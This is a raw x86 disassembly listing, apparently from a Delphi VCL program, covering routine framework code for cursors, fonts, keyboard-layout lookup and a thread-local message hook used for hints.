lea eax [ ebp - 0x4 ]
call sub_40462c
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45b8d4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_443dfc
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443404
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_443418
mov dl [ ebx + 0x57 ]
call sub_43e06c
inc edi
dec esi
jne r-xdata
sub_45b978
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45b9a8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45b9d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41942c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45bd7c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45bd88
mov eax ebx
call sub_45bd94
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_4581b0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c554
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c554
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c554
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45c1b4
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c090
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c090
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45c090
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_45bb30
push ebx
push esi
push edi
push ebp
call sub_40361c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403290
mov eax [ ebp + 0x88 ]
call sub_403290
mov eax [ ebp + 0x84 ]
call sub_403290
mov eax [ ebp + 0x54 ]
call sub_403290
mov eax [ ebp + 0x50 ]
call sub_403290
mov eax [ ebp + 0x4c ]
call sub_403290
mov eax [ ebp + 0x30 ]
call sub_403290
mov eax [ ebp + 0x34 ]
call sub_403290
mov eax [ ebp + 0x7c ]
call sub_403290
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403290
mov eax ebp
call sub_45bdf0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419478
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403604
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413a74
call sub_403290
inc edi
dec esi
jne r-xdata
sub_45bca8
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45bcf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413918
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413918
mov eax [ rw-data ]
call sub_45ea80
sub_45bd2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413bb8
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413bb8
mov eax [ rw-data ]
call sub_45ea80
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_445f40
sub_45bd94
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45be4c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45bdf0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_45be4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45be74
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45c01f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c026
lea eax [ ebp - 0x260 ]
call sub_403fe0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403fe0
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41561c
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408b90
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4496e8
test al al
je r-xdata
xor eax eax
push ebp
push sub_45bfdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404250
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404250
sub_45c090
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45e8f0
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e6a4
mov dl 0x1
mov eax [ rw-data ]
call sub_45e6a4
sub_45c0fc
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45c124
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45c0fc
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406a10
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406998
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45c1b4
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45c2f9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45e6a4
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c8e4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c8e4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41c9c8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c8e4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41c8e4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c8e4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45e6a4
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41c728
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41c728
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c300
cmp [ rw-data ] 0x0
je r-xdata
sub_45c338
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45c398
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_45c4d4 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45c548
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45bca0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413a74
mov dl [ ebp - 0x1 ]
call sub_45c398
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_45bc8c
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413918
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413af0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413a74
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45c338
test al al
je r-xdata
inc esi
sub_45c694
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45bca0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_45bc8c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_45c6ec
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_45c694
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c766
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45c548
pop ecx
push ebp
mov al 0x2
call sub_45c548
pop ecx
push ebp
mov al 0x3
call sub_45c548
pop ecx
push ebp
mov al 0x4
call sub_45c548
pop ecx
push ebp
mov al 0x5
call sub_45c548
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_45c774
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c308
xor eax eax
push ebp
push sub_45c7ed
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45c6ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45c310
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_45c808
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403fe0
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_404034
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_45c860
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_45c891
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_45ecac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45c8b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43c9c4
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45ed28
sub_45c910
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ddc8
sub_45c954
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_45c910
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_45c8b4
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_45c9c8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_45ca24
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_45ca54
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_45ca7c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_45ca24
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_45ca54
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_45ca54
sub_45cabc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41942c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45e194
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
